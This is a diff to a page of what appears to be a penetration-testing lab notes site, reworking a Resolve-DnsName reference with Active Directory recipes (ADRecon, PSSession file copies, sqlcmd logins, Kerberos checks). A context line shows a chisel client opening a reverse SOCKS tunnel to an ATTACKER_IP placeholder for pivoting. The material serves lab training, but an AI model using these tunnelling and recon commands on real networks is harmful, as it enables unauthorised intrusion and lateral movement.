@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/resolve-dnsname.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Ask the domain resolver for an address
+[Search this tool’s saved examples](/commands/notebook?tool=resolve-dnsname) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Ask the domain resolver for an address
 
 **Run in:** Windows PowerShell. **Requires:** Observed host FQDN and the resolver that serves the lab domain.
 
@@ -21,53 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 Resolve-DnsName -Name HOST_FQDN -Server DC_IP -Type A
 ```
 
-**Read the result:** Read the returned record type, answer and responding resolver; distinguish authoritative data from cached results.
-
-**If The default resolver answers differently:** An A record is not an SRV record, and a hostname resolving on one machine does not prove it resolves on your pivot.
+**What the result establishes:** Read the returned record type, answer and responding resolver; distinguish authoritative data from cached results.
 
 **Next check:** Record the returned address and resolver; use SRV queries separately when locating domain services.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://learn.microsoft.com/en-us/powershell/module/dnsclient/resolve-dnsname)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## Resolve-DnsName: choose the operation and read the result
-
-Find the IP address of a computer such as MS01; use the lab DNS server if the default lookup fails.
-
-### What the result establishes
-
-Read the returned record type, answer and responding resolver; distinguish authoritative data from cached results.
-
-### Prerequisites and common failures
-
-An A record is not an SRV record, and a hostname resolving on one machine does not prove it resolves on your pivot.
-
-### Example 1: Commands
-
-Run in: **Windows PowerShell**. Replace DOMAIN and DC_IP with the lab domain and its DNS/DC address.
-
-```powershell
-Resolve-DnsName -Name MS01 -Type A
-Resolve-DnsName -Name MS01.DOMAIN -Server DC_IP -Type A
-(Resolve-DnsName -Name MS01.DOMAIN -Server DC_IP -Type A).IPAddress
-```
-
-## Saved commands and notebook recipes
-
-Find the IP address of a computer such as MS01; use the lab DNS server if the default lookup fails.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=resolve-dnsname) · [All tools](/index)
 
 ## Commands
 
@@ -81,13 +45,38 @@ Resolve-DnsName -Name MS01.DOMAIN -Server DC_IP -Type A
 
 Replace DOMAIN and DC_IP with the lab domain and its DNS/DC address.
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| The default resolver answers differently | An A record is not an SRV record, and a hostname resolving on one machine does not prove it resolves on your pivot. |
 
 ## Notebook recipes
 
-3 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+9 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
+
+<Accordion title="1. Separate network, names and time from authentication">
+
+### 1. Separate network, names and time from authentication
+
+**Active Directory: Enumeration Methodology**
+
+```powershell
+Resolve-DnsName dc01.lab.htb
+Test-NetConnection dc01.lab.htb -Port 389
+nltest /dsgetdc:lab.htb
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory: Enumeration Methodology — 1. Separate network, names and time from authentication](/active-directory/methodology#1-separate-network-names-and-time-from-authentication)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
 
 <Accordion title="Running ADRecon">
 
@@ -130,6 +119,68 @@ PS C:\htb> .\ADRecon.ps1
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Additional AD Auditing Tools — Running ADRecon](/active-directory/auditing-tools#running-adrecon)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Commands">
+
+### Commands
+
+**Copy-Item**
+
+```powershell
+$Session = New-PSSession -ComputerName MS01
+Copy-Item -Path C:\file.txt -ToSession $Session -Destination C:\Users\Public\file.txt
+Copy-Item -Path C:\Users\Public\file.txt -FromSession $Session -Destination C:\file.txt
+```
+
+**Test-NetConnection**
+
+```powershell
+Test-NetConnection -ComputerName MS01 -Port 445
+```
+
+**sqlcmd**
+
+```bash
+sqlcmd -S TARGET_IP -U USER -P "PASSWORD"
+# Current Windows account
+sqlcmd -S MS01 -E
+```
+
+</Accordion>
+
+<Accordion title="Resolve one computer object">
+
+### Resolve one computer object
+
+**Get-ADComputer**
+
+```powershell
+Import-Module ActiveDirectory
+Get-ADComputer -Identity MS01 -Properties DNSHostName,IPv4Address | Select-Object Name,DNSHostName,IPv4Address
+```
+
+</Accordion>
+
+<Accordion title="Establish DNS and time">
+
+### Establish DNS and time
+
+**Kerberos when NTLM is unavailable**
+
+```powershell
+Resolve-DnsName DC_FQDN
+w32tm /query /status
+klist
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberos when NTLM is unavailable — Establish DNS and time](/field/ntlm-disabled#establish-dns-and-time)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -179,6 +230,10 @@ c:\tools\chisel.exe client <ATTACKER_IP>:8080 R:socks
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://learn.microsoft.com/en-us/powershell/module/dnsclient/resolve-dnsname)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -186,5 +241,3 @@ c:\tools\chisel.exe client <ATTACKER_IP>:8080 R:socks
 - [DNS Enumeration and Zone Transfers](/enumeration/dns-enumeration-domain-name-system)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
